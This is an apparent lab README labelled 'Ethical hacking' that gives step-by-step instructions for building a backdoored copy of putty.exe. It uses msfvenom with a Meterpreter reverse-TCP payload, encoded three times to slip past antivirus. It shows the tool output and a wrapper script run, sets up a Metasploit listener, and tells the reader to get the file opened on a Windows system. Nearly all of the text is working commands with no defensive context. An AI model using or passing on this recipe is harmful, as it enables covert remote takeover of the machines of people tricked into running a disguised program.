# Secu_03
### `Ethical hacking`
we are going to use a trapped file to send to a windows user.
`Lab: backdoor`

* Install putty<hr>
program for remote connections, 
download here <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a>
<hr>
we will link our putty.exe file to our backdoor.

## console
```terminal
msfvenom -a x86 -x /home/samglish/Téléchargements/putty.exe -k -p windows/meterpreter/reverse_tcp lhost=your_Ip_adress lport=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o hello.exe 
```
I explain to you
* msfvenom a metasploit module that will help us to :
<p>--plateform windows, create a backdoor for windows platform</p>
<p>x86/shikata_ga_nai -i 3 -b "\x00", the module that will help us encode our file so as not to be detected by the antivirus, we encoded it 3 times.</p>
<p>the output file will be hello.exe </p>

`output`
```terminal
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai chosen with final size 435
Payload size: 435 bytes
Final size of exe file: 1889792 bytes
Saved as: hello.exe
```
let's check if it's the windows exectable.
```terminal
file hello.exe
```
output:
```output
hello.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```
<hr>

## Use my script
┌─[✗]─[samglish@parrotOS]─[~/Desktop]
└──╼ $bash testt.sh 
***********************************************************
*                   Ethical Hacking                       *
*                      BACKDOOR                           *
*                      Samglish                           *
***********************************************************
Installing tools...
------------------------------------------------------------
***Metasploit-framework***
Please wait...
 
 Voulez vous creer votre backdoor?
 1. Oui
 2. Non
Choix : 1
votre adresse ip : 172.24.10.4
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai chosen with final size 435
Payload size: 435 bytes
Saved as: backdoor.exe
backdoor.exe created
nous lancons l'exploit
                                                  
### cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Save the current environment with the 
save command, future console restarts will use this 
environment again

msf6 > 

<hr>

## exploit with msfconsole
now we will head to metasploit.
```terminal
msfconsole
```
output:
```output
msf6 > use exploit/multi/handler
```
after
```terminal
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >set payload windows/meterpreter/reverse_tcp
```
output:
```output
payload => windows/meterpreter/reverse_tcp
```
```terminal
msf6 exploit(multi/handler) > set lhost adress_ip
```
```terminal
msf6 exploit(multi/handler) > set lport 3232
```
`now we launch exploit`
```terminal
msf6 exploit(multi/handler) > exploit
```
```terminal
[*] Started reverse TCP handler on your_ip_adress:3232 
```
All you have to do is copy the hello.exe file and open it on a Windows system.